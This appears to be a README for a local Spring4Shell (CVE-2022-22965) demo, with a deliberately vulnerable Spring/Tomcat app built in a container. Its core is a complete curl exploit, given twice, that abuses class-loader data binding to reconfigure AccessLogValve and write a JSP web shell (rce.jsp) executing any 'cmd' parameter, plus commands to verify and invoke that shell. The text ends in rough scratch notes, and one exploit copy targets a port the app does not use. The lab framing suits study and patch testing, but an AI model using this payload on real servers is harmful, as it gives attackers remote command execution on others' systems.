# Spring4Shell (CVE-2022-22965) Demo App and an exploit
Demonstrates the CVE-2022-22965 vulnerability in Spring Framework data binding that allows RCE via Tomcat's AccessLogValve.

## Requirements:
- JDK 11+ (JDK 9 min. vulnerable version)
- Maven
- Docker or Podman
- Python >=3.12

## The demo app

```
cd test-app 
mvn clean compile

run the app locally  // not vulnerable
mvn spring-boot:run 
```

Access the web app via: http://localhost:8080/greeting

Build the `war` for vulnerable deployment
```
mvn clean package -DskipTests

// for macos + podman users
podman machine init
podman machine start

podman build -t test-app .
podman run -d --name test-app -p 8080:8080 test-app
```

Access the containerized  (vulnerable) app via http://localhost:8080/spring4shell-demo/greeting

### Troubleshooting the demo app
```
podman logs test-app
jar tf target/spring4shell-demo.war | head -20
```

## Exploit

bash
curl -X POST \
  -H "pre:<%" \
  -H "post:;>" \
  -H "colon:;" \
  -F 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{pre}i java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream()%{colon}i int a = -1%{colon}i byte[] b = new byte[2048]%{colon}i while((a=in.read(b))!=-1){ out.println(new String(b))%{colon}i } %{post}i' \
  -F 'class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp' \
  -F 'class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/app' \
  -F 'class.module.classLoader.resources.context.parent.pipeline.first.prefix=rce' \
  -F 'class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=' \
  http://localhost:8888/greeting


Verify if the Webshell was injected

podman exec test-app ls -la /usr/local/tomcat/webapps/app/
podman exec test-app cat /usr/local/tomcat/webapps/app/rce.jsp

curl "http://localhost:8080/spring4shell-demo/rce.jsp?cmd=whoami"


Debug class loader chain
curl http://localhost:8080/spring4shell-demo/debug/chain

FAQ
Q: How do I know getFirst() returns AccessLogValve?
Depends on Tomcat configuration. Default has AccessLogValve in server.xml. Use /debug/chain to see actual valve.
Q: Is JAR packaging vulnerable?
No. JAR uses embedded Tomcat with different classloader hierarchy. The chain classLoader.getResources().getContext() doesn't exist in embedded mode.
Q: Is @RestController vulnerable?
Yes with form data, no with JSON:
java
public User create(User user) { }              // Vulnerable
public User create(@RequestBody User user) { } // Safe

Cleanup

podman stop test-app && podman rm test-app

References
Tomcat AccessLogValve
CVE-2022-22965



curl -X POST \
-H "pre:<%" \
-H "post:;>" \
-H "colon:;" \
-F 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{pre}i java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream()%{colon}i int a = -1%{colon}i byte[] b = new byte[2048]%{colon}i while((a=in.read(b))!=-1){ out.println(new String(b))%{colon}i } %{post}i' \
-F 'class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp' \
-F 'class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/app' \
-F 'class.module.classLoader.resources.context.parent.pipeline.first.prefix=rce' \
-F 'class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=' \
http://localhost:8080/greeting


how do I know that getFirst() will return AccessLogValve?
How can I be sure JAR packaging is not vulnerable. Maybe just the exploit is not public?
Is @RestController also vulnerable


Running the python expoit:
pip install -r requirements.txt
python exploit.py

references:
https://tomcat.apache.org/tomcat-9.0-doc/config/valve.html#Access_Log_Valve/Attributes

https://www.geeksforgeeks.org/python/how-to-create-requirements-txt-file-in-python/
https://www.geeksforgeeks.org/installation-guide/how-to-install-virtual-environment-in-python-on-macos/


source exploit/bin/activate


failed 
no basic error handling